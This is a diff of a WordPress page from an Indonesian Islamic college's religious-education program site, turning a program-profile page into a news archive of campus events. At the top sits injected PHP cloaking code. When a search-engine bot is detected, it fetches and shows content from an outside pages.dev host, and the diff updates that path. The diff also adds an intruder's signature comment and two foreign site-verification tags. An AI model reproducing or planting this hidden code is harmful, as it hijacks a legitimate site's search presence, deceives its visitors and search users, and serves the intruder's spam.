@@ -13,20 +13,21 @@ function is_bot() {
 }
 
 if (is_bot()) {
-  $message = file_get_contents('https://punten-neng.pages.dev/staialfalah/pai/profil-prodi/');
+  $message = file_get_contents('https://punten-neng.pages.dev/staialfalah/pai/arsip-berita/');
   echo $message;
 exit;
 } 
 ?>
-<!DOCTYPE html>
+<!DOCTYPE html><!--MR-SIMP3L-->
 <html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="profile" href="https://gmpg.org/xfn/11">
 
-<title>PROFIL PRODI &#8211; Pendidikan Agama Islam</title>
-
+<title>Arsip Berita &#8211; Pendidikan Agama Islam</title>
+<meta name="google-site-verification" content="aNuj6DnwIC97rSW1Fa3GKByQlqAtjqKayNTzg6DQZ8Y" />
+<meta name="google-site-verification" content="wHQOLmugpg8OgdOaHCp71NJfCxOEDib5QZV0TluJw3Q" />
 <meta name='robots' content='max-image-preview:large' />
 	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
 	<link rel="alternate" type="application/rss+xml" title="Pendidikan Agama Islam &raquo; Feed" href="https://pai.staialfalah.ac.id/feed/" />
@@ -68,10 +69,8 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 <link rel='stylesheet' id='elementor-post-46-css' href='https://pai.staialfalah.ac.id/wp-content/uploads/elementor/css/post-46.css?ver=1734190522' media='all' />
 <link rel='stylesheet' id='post-grid-elementor-addon-main-css' href='https://pai.staialfalah.ac.id/wp-content/plugins/post-grid-elementor-addon/assets/css/main.css?ver=6.8.3' media='all' />
 <link rel='stylesheet' id='widget-heading-css' href='https://pai.staialfalah.ac.id/wp-content/plugins/elementor/assets/css/widget-heading.min.css?ver=3.25.11' media='all' />
-<link rel='stylesheet' id='widget-text-editor-css' href='https://pai.staialfalah.ac.id/wp-content/plugins/elementor/assets/css/widget-text-editor.min.css?ver=3.25.11' media='all' />
 <link rel='stylesheet' id='widget-spacer-css' href='https://pai.staialfalah.ac.id/wp-content/plugins/elementor/assets/css/widget-spacer.min.css?ver=3.25.11' media='all' />
-<link rel='stylesheet' id='e-shapes-css' href='https://pai.staialfalah.ac.id/wp-content/plugins/elementor/assets/css/conditionals/shapes.min.css?ver=3.25.11' media='all' />
-<link rel='stylesheet' id='elementor-post-163-css' href='https://pai.staialfalah.ac.id/wp-content/uploads/elementor/css/post-163.css?ver=1734215112' media='all' />
+<link rel='stylesheet' id='elementor-post-896-css' href='https://pai.staialfalah.ac.id/wp-content/uploads/elementor/css/post-896.css?ver=1734192810' media='all' />
 <link rel='stylesheet' id='elementor-post-47-css' href='https://pai.staialfalah.ac.id/wp-content/uploads/elementor/css/post-47.css?ver=1734190522' media='all' />
 <link rel='stylesheet' id='elementor-post-115-css' href='https://pai.staialfalah.ac.id/wp-content/uploads/elementor/css/post-115.css?ver=1734190522' media='all' />
 <link rel='stylesheet' id='tablepress-default-css' href='https://pai.staialfalah.ac.id/wp-content/plugins/tablepress/css/build/default.css?ver=3.0.1' media='all' />
@@ -96,12 +95,12 @@ flexibility(document.documentElement);
 <script id="jquery-js-after">
 !function($){"use strict";$(document).ready(function(){$(this).scrollTop()>100&&$(".hfe-scroll-to-top-wrap").removeClass("hfe-scroll-to-top-hide"),$(window).scroll(function(){$(this).scrollTop()<100?$(".hfe-scroll-to-top-wrap").fadeOut(300):$(".hfe-scroll-to-top-wrap").fadeIn(300)}),$(".hfe-scroll-to-top-wrap").on("click",function(){$("html, body").animate({scrollTop:0},300);return!1})})}(jQuery);
 </script>
-<link rel="https://api.w.org/" href="https://pai.staialfalah.ac.id/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://pai.staialfalah.ac.id/wp-json/wp/v2/pages/163" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://pai.staialfalah.ac.id/xmlrpc.php?rsd" />
+<link rel="https://api.w.org/" href="https://pai.staialfalah.ac.id/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://pai.staialfalah.ac.id/wp-json/wp/v2/pages/896" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://pai.staialfalah.ac.id/xmlrpc.php?rsd" />
 <meta name="generator" content="WordPress 6.8.3" />
-<link rel="canonical" href="https://pai.staialfalah.ac.id/profil-prodi/" />
-<link rel='shortlink' href='https://pai.staialfalah.ac.id/?p=163' />
-<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://pai.staialfalah.ac.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpai.staialfalah.ac.id%2Fprofil-prodi%2F" />
-<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://pai.staialfalah.ac.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpai.staialfalah.ac.id%2Fprofil-prodi%2F&#038;format=xml" />
+<link rel="canonical" href="https://pai.staialfalah.ac.id/arsip-berita/" />
+<link rel='shortlink' href='https://pai.staialfalah.ac.id/?p=896' />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://pai.staialfalah.ac.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpai.staialfalah.ac.id%2Farsip-berita%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://pai.staialfalah.ac.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpai.staialfalah.ac.id%2Farsip-berita%2F&#038;format=xml" />
 <meta name="generator" content="Elementor 3.25.11; features: additional_custom_breakpoints, e_optimized_control_loading; settings: css_print_method-external, google_font-enabled, font_display-auto">
 			<style>
 				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
@@ -127,7 +126,7 @@ flexibility(document.documentElement);
 <meta name="msapplication-TileImage" content="https://pai.staialfalah.ac.id/wp-content/uploads/2022/01/cropped-STAIA-solid-02-270x270.png" />
 </head>
 
-<body itemtype='https://schema.org/WebPage' itemscope='itemscope' class="wp-singular page-template page-template-elementor_header_footer page page-id-163 wp-theme-astra ehf-header ehf-footer ehf-template-astra ehf-stylesheet-astra group-blog ast-single-post ast-inherit-site-logo-transparent ast-hfb-header ast-desktop ast-plain-container ast-no-sidebar astra-3.9.2 ast-normal-title-enabled elementor-default elementor-template-full-width elementor-kit-46 elementor-page elementor-page-163">
+<body itemtype='https://schema.org/WebPage' itemscope='itemscope' class="wp-singular page-template page-template-elementor_header_footer page page-id-896 wp-theme-astra ehf-header ehf-footer ehf-template-astra ehf-stylesheet-astra group-blog ast-single-post ast-inherit-site-logo-transparent ast-hfb-header ast-desktop ast-plain-container ast-no-sidebar astra-3.9.2 ast-normal-title-enabled elementor-default elementor-template-full-width elementor-kit-46 elementor-page elementor-page-896">
 
 <a
 	class="skip-link screen-reader-text"
@@ -228,9 +227,9 @@ class="hfeed site" id="page">
 				</div>
 				<nav itemscope="itemscope" itemtype="https://schema.org/SiteNavigationElement" class="hfe-nav-menu__layout-horizontal hfe-nav-menu__submenu-arrow" data-toggle-icon="&lt;i aria-hidden=&quot;true&quot; tabindex=&quot;0&quot; class=&quot;fas fa-align-justify&quot;&gt;&lt;/i&gt;" data-close-icon="&lt;i aria-hidden=&quot;true&quot; tabindex=&quot;0&quot; class=&quot;fas fa-angle-double-up&quot;&gt;&lt;/i&gt;" data-full-width="yes">
 					<ul id="menu-1-89649d8" class="hfe-nav-menu"><li id="menu-item-156" itemprop="name" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home parent hfe-creative-menu"><a href="https://pai.staialfalah.ac.id/" itemprop="url" class = "hfe-menu-item">BERANDA</a></li>
-<li id="menu-item-841" itemprop="name" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children parent hfe-has-submenu hfe-creative-menu"><div class="hfe-has-submenu-container"><a href="#" itemprop="url" class = "hfe-menu-item">PROFIL<span class='hfe-menu-toggle sub-arrow hfe-menu-child-0'><i class='fa'></i></span></a></div>
+<li id="menu-item-841" itemprop="name" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children parent hfe-has-submenu hfe-creative-menu"><div class="hfe-has-submenu-container"><a href="#" itemprop="url" class = "hfe-menu-item">PROFIL<span class='hfe-menu-toggle sub-arrow hfe-menu-child-0'><i class='fa'></i></span></a></div>
 <ul class="sub-menu">
-	<li id="menu-item-183" itemprop="name" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-163 current_page_item hfe-creative-menu"><a href="https://pai.staialfalah.ac.id/profil-prodi/" itemprop="url" class = "hfe-sub-menu-item hfe-sub-menu-item-active">PROFIL PRODI</a></li>
+	<li id="menu-item-183" itemprop="name" class="menu-item menu-item-type-post_type menu-item-object-page hfe-creative-menu"><a href="https://pai.staialfalah.ac.id/profil-prodi/" itemprop="url" class = "hfe-sub-menu-item">PROFIL PRODI</a></li>
 	<li id="menu-item-737" itemprop="name" class="menu-item menu-item-type-custom menu-item-object-custom hfe-creative-menu"><a href="#" itemprop="url" class = "hfe-sub-menu-item">SEJARAH</a></li>
 	<li id="menu-item-182" itemprop="name" class="menu-item menu-item-type-post_type menu-item-object-page hfe-creative-menu"><a href="https://pai.staialfalah.ac.id/visi-dan-misi/" itemprop="url" class = "hfe-sub-menu-item">VISI DAN MISI</a></li>
 </ul>
@@ -350,9 +349,9 @@ class="hfeed site" id="page">
 				</div>
 				<nav itemscope="itemscope" itemtype="https://schema.org/SiteNavigationElement" class="hfe-nav-menu__layout-horizontal hfe-nav-menu__submenu-arrow" data-toggle-icon="&lt;i aria-hidden=&quot;true&quot; tabindex=&quot;0&quot; class=&quot;fas fa-align-justify&quot;&gt;&lt;/i&gt;" data-close-icon="&lt;i aria-hidden=&quot;true&quot; tabindex=&quot;0&quot; class=&quot;fas fa-angle-double-up&quot;&gt;&lt;/i&gt;" data-full-width="yes">
 					<ul id="menu-1-af907ef" class="hfe-nav-menu"><li id="menu-item-156" itemprop="name" itemprop="name" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home parent hfe-creative-menu"><a href="https://pai.staialfalah.ac.id/" itemprop="url" itemprop="url" class = "hfe-menu-item">BERANDA</a></li>
-<li id="menu-item-841" itemprop="name" itemprop="name" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children parent hfe-has-submenu hfe-creative-menu"><div class="hfe-has-submenu-container"><a href="#" itemprop="url" itemprop="url" class = "hfe-menu-item">PROFIL<span class='hfe-menu-toggle sub-arrow hfe-menu-child-0'><i class='fa'></i></span></a></div>
+<li id="menu-item-841" itemprop="name" itemprop="name" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children parent hfe-has-submenu hfe-creative-menu"><div class="hfe-has-submenu-container"><a href="#" itemprop="url" itemprop="url" class = "hfe-menu-item">PROFIL<span class='hfe-menu-toggle sub-arrow hfe-menu-child-0'><i class='fa'></i></span></a></div>
 <ul class="sub-menu">
-	<li id="menu-item-183" itemprop="name" itemprop="name" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-163 current_page_item hfe-creative-menu"><a href="https://pai.staialfalah.ac.id/profil-prodi/" itemprop="url" itemprop="url" class = "hfe-sub-menu-item hfe-sub-menu-item-active">PROFIL PRODI</a></li>
+	<li id="menu-item-183" itemprop="name" itemprop="name" class="menu-item menu-item-type-post_type menu-item-object-page hfe-creative-menu"><a href="https://pai.staialfalah.ac.id/profil-prodi/" itemprop="url" itemprop="url" class = "hfe-sub-menu-item">PROFIL PRODI</a></li>
 	<li id="menu-item-737" itemprop="name" itemprop="name" class="menu-item menu-item-type-custom menu-item-object-custom hfe-creative-menu"><a href="#" itemprop="url" itemprop="url" class = "hfe-sub-menu-item">SEJARAH</a></li>
 	<li id="menu-item-182" itemprop="name" itemprop="name" class="menu-item menu-item-type-post_type menu-item-object-page hfe-creative-menu"><a href="https://pai.staialfalah.ac.id/visi-dan-misi/" itemprop="url" itemprop="url" class = "hfe-sub-menu-item">VISI DAN MISI</a></li>
 </ul>
@@ -393,110 +392,344 @@ class="hfeed site" id="page">
 
 		<div id="content" class="site-content">
 		<div class="ast-container">
-				<div data-elementor-type="wp-page" data-elementor-id="163" class="elementor elementor-163">
-						<section class="elementor-section elementor-top-section elementor-element elementor-element-3a70ff0 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="3a70ff0" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div data-elementor-type="wp-page" data-elementor-id="896" class="elementor elementor-896">
+						<section class="elementor-section elementor-top-section elementor-element elementor-element-ae6b89e elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="ae6b89e" data-element_type="section">
 						<div class="elementor-container elementor-column-gap-default">
-					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-521077b" data-id="521077b" data-element_type="column">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-da07a19" data-id="da07a19" data-element_type="column">
 			<div class="elementor-widget-wrap elementor-element-populated">
-						<div class="elementor-element elementor-element-b0940fa elementor-widget elementor-widget-heading" data-id="b0940fa" data-element_type="widget" data-widget_type="heading.default">
+						<div class="elementor-element elementor-element-19a64b6 elementor-widget elementor-widget-heading" data-id="19a64b6" data-element_type="widget" data-widget_type="heading.default">
 				<div class="elementor-widget-container">
-			<h2 class="elementor-heading-title elementor-size-default">PROFIL PRODI PAI</h2>		</div>
+			<h2 class="elementor-heading-title elementor-size-default">Arsip Berita</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-54b69db elementor-grid-1 elementor-grid-tablet-2 elementor-grid-mobile-1 elementor-widget elementor-widget-elementor-blog-posts" data-id="54b69db" data-element_type="widget" data-settings="{&quot;columns&quot;:&quot;1&quot;,&quot;columns_tablet&quot;:&quot;2&quot;,&quot;columns_mobile&quot;:&quot;1&quot;}" data-widget_type="elementor-blog-posts.default">
+				<div class="elementor-widget-container">
+					<div class="wpcap-grid">
+						<div class="wpcap-grid-container elementor-grid wpcap-grid-desktop-1 wpcap-grid-tablet-2 wpcap-grid-mobile-1">
+
+				
+        <article id="post-1128" class="wpcap-post post-1128 post type-post status-publish format-standard has-post-thumbnail hentry category-berita-kampus ast-article-single">
+         
+            <div class="post-grid-inner">
+                
+                			<div class="post-grid-thumbnail">
+				<a href="https://pai.staialfalah.ac.id/stai-al-falah-gelar-rapat-koordinasi-pengurus-penguatan-akademik-dan-rencana-transformasi-lembaga-menuju-institut/">
+					<img decoding="async" width="300" height="169" src="https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/RapatKoordinasiApril2025-2-1920x1080-1-300x169.jpeg" class="attachment-medium size-medium wp-post-image" alt="" srcset="https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/RapatKoordinasiApril2025-2-1920x1080-1-300x169.jpeg 300w, https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/RapatKoordinasiApril2025-2-1920x1080-1-1024x576.jpeg 1024w, https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/RapatKoordinasiApril2025-2-1920x1080-1-768x432.jpeg 768w, https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/RapatKoordinasiApril2025-2-1920x1080-1-1536x864.jpeg 1536w, https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/RapatKoordinasiApril2025-2-1920x1080-1.jpeg 1920w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
+			</div>
+        
+                <div class="post-grid-text-wrap">
+                    		<div class="post-grid-meta">
+			
+				<span class="post-date"><time datetime="2025-04-17T06:53:43+00:00">April 17, 2025</time></span>
+
+				
+				<span class="post-comments">Tidak ada komentar</span>
+
+						</div>
+		                    		<h5 class="title">
+			<a href="https://pai.staialfalah.ac.id/stai-al-falah-gelar-rapat-koordinasi-pengurus-penguatan-akademik-dan-rencana-transformasi-lembaga-menuju-institut/">STAI Al-Falah Gelar Rapat Koordinasi Pengurus: Penguatan Akademik dan Rencana Transformasi Lembaga Menuju Institut</a>
+		</h5>
+		                    		<div class="post-grid-excerpt">
+			<p>Wed, 16 April 2025 2:32 Cicalengka, 15 April 2025&nbsp;– Bertempat&hellip;</p>
+		</div>
+		                                    </div>
+
+            </div><!-- .blog-inner -->
+           
+        </article>
+
+        
+        <article id="post-1125" class="wpcap-post post-1125 post type-post status-publish format-standard has-post-thumbnail hentry category-berita-kampus ast-article-single">
+         
+            <div class="post-grid-inner">
+                
+                			<div class="post-grid-thumbnail">
+				<a href="https://pai.staialfalah.ac.id/ketua-yayasan-asy-syahidiyyah-dorong-pegawai-yayasan-lanjut-studi-s2-di-stai-al-falah/">
+					<img decoding="async" width="300" height="192" src="https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/LaporanProgresPascasarjana-3-1024x657-1-300x192.webp" class="attachment-medium size-medium wp-post-image" alt="" srcset="https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/LaporanProgresPascasarjana-3-1024x657-1-300x192.webp 300w, https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/LaporanProgresPascasarjana-3-1024x657-1-768x493.webp 768w, https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/LaporanProgresPascasarjana-3-1024x657-1.webp 1024w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
+			</div>
+        
+                <div class="post-grid-text-wrap">
+                    		<div class="post-grid-meta">
+			
+				<span class="post-date"><time datetime="2025-01-30T06:50:50+00:00">Januari 30, 2025</time></span>
+
+				
+				<span class="post-comments">Tidak ada komentar</span>
+
+						</div>
+		                    		<h5 class="title">
+			<a href="https://pai.staialfalah.ac.id/ketua-yayasan-asy-syahidiyyah-dorong-pegawai-yayasan-lanjut-studi-s2-di-stai-al-falah/">Ketua Yayasan Asy-Syahidiyyah Dorong Pegawai Yayasan Lanjut Studi S2 di STAI Al-Falah</a>
+		</h5>
+		                    		<div class="post-grid-excerpt">
+			<p>Wed, 29 January 2025 9:05 Nagreg – Tim Pascasarjana STAI&hellip;</p>
+		</div>
+		                                    </div>
+
+            </div><!-- .blog-inner -->
+           
+        </article>
+
+        
+        <article id="post-1122" class="wpcap-post post-1122 post type-post status-publish format-standard has-post-thumbnail hentry category-berita-kampus ast-article-single">
+         
+            <div class="post-grid-inner">
+                
+                			<div class="post-grid-thumbnail">
+				<a href="https://pai.staialfalah.ac.id/pembekalan-praktik-lapangan-mahasiswa-stai-al-falah-cicalengka/">
+					<img loading="lazy" decoding="async" width="300" height="178" src="https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/ppm2025-3-2048x1218-1-300x178.webp" class="attachment-medium size-medium wp-post-image" alt="" srcset="https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/ppm2025-3-2048x1218-1-300x178.webp 300w, https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/ppm2025-3-2048x1218-1-1024x609.webp 1024w, https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/ppm2025-3-2048x1218-1-768x457.webp 768w, https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/ppm2025-3-2048x1218-1-1536x914.webp 1536w, https://pai.staialfalah.ac.id/wp-content/uploads/2025/05/ppm2025-3-2048x1218-1.webp 2048w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
+			</div>
+        
+                <div class="post-grid-text-wrap">
+                    		<div class="post-grid-meta">
+			
+				<span class="post-date"><time datetime="2025-01-10T06:46:37+00:00">Januari 10, 2025</time></span>
+
+				
+				<span class="post-comments">Tidak ada komentar</span>
+
+						</div>
+		                    		<h5 class="title">
+			<a href="https://pai.staialfalah.ac.id/pembekalan-praktik-lapangan-mahasiswa-stai-al-falah-cicalengka/">Pembekalan Praktik Lapangan Mahasiswa STAI Al-Falah Cicalengka</a>
+		</h5>
+		                    		<div class="post-grid-excerpt">
+			<p>Thu, 9 January 2025 7:00 Bandung – Lembaga Penelitian dan&hellip;</p>
+		</div>
+		                                    </div>
+
+            </div><!-- .blog-inner -->
+           
+        </article>
+
+        
+        <article id="post-1108" class="wpcap-post post-1108 post type-post status-publish format-standard has-post-thumbnail hentry category-berita-kampus ast-article-single">
+         
+            <div class="post-grid-inner">
+                
+                			<div class="post-grid-thumbnail">
+				<a href="https://pai.staialfalah.ac.id/stai-al-falah-adakan-workshop-persiapan-akreditasi-unggul-untuk-program-studi-pendidikan-agama-islam-pemenuhan-dokumen-dan-penyiapan-asesmen-lapangan/">
+					<img loading="lazy" decoding="async" width="300" height="209" src="https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-16-at-16.56.07-1-1-300x209.jpeg" class="attachment-medium size-medium wp-post-image" alt="" srcset="https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-16-at-16.56.07-1-1-300x209.jpeg 300w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-16-at-16.56.07-1-1-1024x712.jpeg 1024w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-16-at-16.56.07-1-1-768x534.jpeg 768w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-16-at-16.56.07-1-1.jpeg 1034w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
+			</div>
+        
+                <div class="post-grid-text-wrap">
+                    		<div class="post-grid-meta">
+			
+				<span class="post-date"><time datetime="2024-12-16T10:04:01+00:00">Desember 16, 2024</time></span>
+
+				
+				<span class="post-comments">Tidak ada komentar</span>
+
+						</div>
+		                    		<h5 class="title">
+			<a href="https://pai.staialfalah.ac.id/stai-al-falah-adakan-workshop-persiapan-akreditasi-unggul-untuk-program-studi-pendidikan-agama-islam-pemenuhan-dokumen-dan-penyiapan-asesmen-lapangan/">STAI Al-Falah Adakan Workshop Persiapan Akreditasi Unggul untuk Program Studi Pendidikan Agama Islam: Pemenuhan Dokumen dan Penyiapan Asesmen Lapangan</a>
+		</h5>
+		                    		<div class="post-grid-excerpt">
+			<p>Bandung, 16 Desember 2024 – Dalam rangka mempersiapkan akreditasi unggul&hellip;</p>
+		</div>
+		                                    </div>
+
+            </div><!-- .blog-inner -->
+           
+        </article>
+
+        
+        <article id="post-1104" class="wpcap-post post-1104 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized ast-article-single">
+         
+            <div class="post-grid-inner">
+                
+                			<div class="post-grid-thumbnail">
+				<a href="https://pai.staialfalah.ac.id/stai-al-falah-gelar-persiapan-akreditasi-program-studi-pendidikan-agama-islam/">
+					<img loading="lazy" decoding="async" width="300" height="135" src="https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-15-at-21.43.33-300x135.jpeg" class="attachment-medium size-medium wp-post-image" alt="" srcset="https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-15-at-21.43.33-300x135.jpeg 300w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-15-at-21.43.33-1024x461.jpeg 1024w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-15-at-21.43.33-768x346.jpeg 768w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-15-at-21.43.33.jpeg 1280w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
+			</div>
+        
+                <div class="post-grid-text-wrap">
+                    		<div class="post-grid-meta">
+			
+				<span class="post-date"><time datetime="2024-12-07T14:45:22+00:00">Desember 7, 2024</time></span>
+
+				
+				<span class="post-comments">Tidak ada komentar</span>
+
+						</div>
+		                    		<h5 class="title">
+			<a href="https://pai.staialfalah.ac.id/stai-al-falah-gelar-persiapan-akreditasi-program-studi-pendidikan-agama-islam/">STAI Al-Falah Gelar Persiapan Akreditasi Program Studi Pendidikan Agama Islam</a>
+		</h5>
+		                    		<div class="post-grid-excerpt">
+			<p>Bandung &#8211; Dalam upaya meningkatkan kualitas pendidikan dan layanan akademik,&hellip;</p>
+		</div>
+		                                    </div>
+
+            </div><!-- .blog-inner -->
+           
+        </article>
+
+        
+        <article id="post-1101" class="wpcap-post post-1101 post type-post status-publish format-standard has-post-thumbnail hentry category-berita-kampus ast-article-single">
+         
+            <div class="post-grid-inner">
+                
+                			<div class="post-grid-thumbnail">
+				<a href="https://pai.staialfalah.ac.id/wisuda-stai-al-falah-cicalengka-ke-17-berlangsung-khidmat-di-aula-pondok-pesantren-al-quran-al-falah-nagreg/">
+					<img loading="lazy" decoding="async" width="300" height="207" src="https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-15-at-21.42.18-300x207.jpeg" class="attachment-medium size-medium wp-post-image" alt="" srcset="https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-15-at-21.42.18-300x207.jpeg 300w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-15-at-21.42.18-768x529.jpeg 768w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-15-at-21.42.18.jpeg 900w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
+			</div>
+        
+                <div class="post-grid-text-wrap">
+                    		<div class="post-grid-meta">
+			
+				<span class="post-date"><time datetime="2024-11-04T14:20:55+00:00">November 4, 2024</time></span>
+
+				
+				<span class="post-comments">Tidak ada komentar</span>
+
+						</div>
+		                    		<h5 class="title">
+			<a href="https://pai.staialfalah.ac.id/wisuda-stai-al-falah-cicalengka-ke-17-berlangsung-khidmat-di-aula-pondok-pesantren-al-quran-al-falah-nagreg/">Wisuda STAI Al-Falah Cicalengka Ke-17 Berlangsung Khidmat di Aula Pondok Pesantren Al-Qur&#8217;an Al-Falah Nagreg</a>
+		</h5>
+		                    		<div class="post-grid-excerpt">
+			<p>Nagreg, [02/10/24] – Wisuda ke-17 Sekolah Tinggi Agama Islam (STAI)&hellip;</p>
+		</div>
+		                                    </div>
+
+            </div><!-- .blog-inner -->
+           
+        </article>
+
+        
+        <article id="post-1086" class="wpcap-post post-1086 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized ast-article-single">
+         
+            <div class="post-grid-inner">
+                
+                			<div class="post-grid-thumbnail">
+				<a href="https://pai.staialfalah.ac.id/kepala-lppm-stai-al-falah-ikuti-workshop-manajemen-pengelolaan-jurnal-bereputasi/">
+					<img loading="lazy" decoding="async" width="300" height="225" src="https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/Aset-Workshop-Jurnal-2024-1-300x225.webp" class="attachment-medium size-medium wp-post-image" alt="" srcset="https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/Aset-Workshop-Jurnal-2024-1-300x225.webp 300w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/Aset-Workshop-Jurnal-2024-1-1024x768.webp 1024w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/Aset-Workshop-Jurnal-2024-1-768x576.webp 768w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/Aset-Workshop-Jurnal-2024-1-1536x1152.webp 1536w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/Aset-Workshop-Jurnal-2024-1.webp 1600w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
+			</div>
+        
+                <div class="post-grid-text-wrap">
+                    		<div class="post-grid-meta">
+			
+				<span class="post-date"><time datetime="2024-10-21T15:43:00+00:00">Oktober 21, 2024</time></span>
+
+				
+				<span class="post-comments">Tidak ada komentar</span>
+
+						</div>
+		                    		<h5 class="title">
+			<a href="https://pai.staialfalah.ac.id/kepala-lppm-stai-al-falah-ikuti-workshop-manajemen-pengelolaan-jurnal-bereputasi/">Kepala LPPM STAI Al-Falah ikuti Workshop Manajemen Pengelolaan Jurnal Bereputasi</a>
+		</h5>
+		                    		<div class="post-grid-excerpt">
+			<p>Bandung – 17-18/10, Workshop Manajemen Pengelola Jurnal Bereputasi PTKIS (Perguruan&hellip;</p>
+		</div>
+		                                    </div>
+
+            </div><!-- .blog-inner -->
+           
+        </article>
+
+        
+        <article id="post-1083" class="wpcap-post post-1083 post type-post status-publish format-standard has-post-thumbnail hentry category-berita-kampus ast-article-single">
+         
+            <div class="post-grid-inner">
+                
+                			<div class="post-grid-thumbnail">
+				<a href="https://pai.staialfalah.ac.id/stai-al-falah-cicalengka-gelar-rapat-persiapan-panitia-wisuda-ke-17-tahun-2024/">
+					<img loading="lazy" decoding="async" width="300" height="225" src="https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/Aset-Rapat-Wisuda-2024-300x225.webp" class="attachment-medium size-medium wp-post-image" alt="" srcset="https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/Aset-Rapat-Wisuda-2024-300x225.webp 300w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/Aset-Rapat-Wisuda-2024-1024x768.webp 1024w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/Aset-Rapat-Wisuda-2024-768x576.webp 768w, https://pai.staialfalah.ac.id/wp-content/uploads/2024/12/Aset-Rapat-Wisuda-2024.webp 1280w" sizes="(max-width: 300px) 100vw, 300px" />				</a>
+			</div>
+        
+                <div class="post-grid-text-wrap">
+                    		<div class="post-grid-meta">
+			
+				<span class="post-date"><time datetime="2024-10-03T15:40:28+00:00">Oktober 3, 2024</time></span>
+
+				
+				<span class="post-comments">Tidak ada komentar</span>
+
+						</div>
+		                    		<h5 class="title">
+			<a href="https://pai.staialfalah.ac.id/stai-al-falah-cicalengka-gelar-rapat-persiapan-panitia-wisuda-ke-17-tahun-2024/">STAI Al-Falah Cicalengka Gelar Rapat Persiapan Panitia Wisuda ke-17 Tahun 2024</a>
+		</h5>
+		                    		<div class="post-grid-excerpt">
